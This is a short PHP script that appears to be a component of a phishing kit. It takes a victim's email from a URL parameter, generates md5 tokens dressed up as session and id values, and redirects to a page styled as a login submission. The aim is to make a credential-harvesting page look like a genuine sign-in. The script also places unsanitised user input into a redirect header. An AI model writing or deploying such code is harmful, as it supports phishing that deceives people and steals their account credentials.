<?php

        $logn = $_GET['logn'];
$email=$logn;
	require_once 'hostname.php';

	$praga=rand();

	 $praga=md5($praga);



	header("location: start.php?cmd=login_submit&id=$praga$praga&session=$praga$praga&logn=$logn");





?>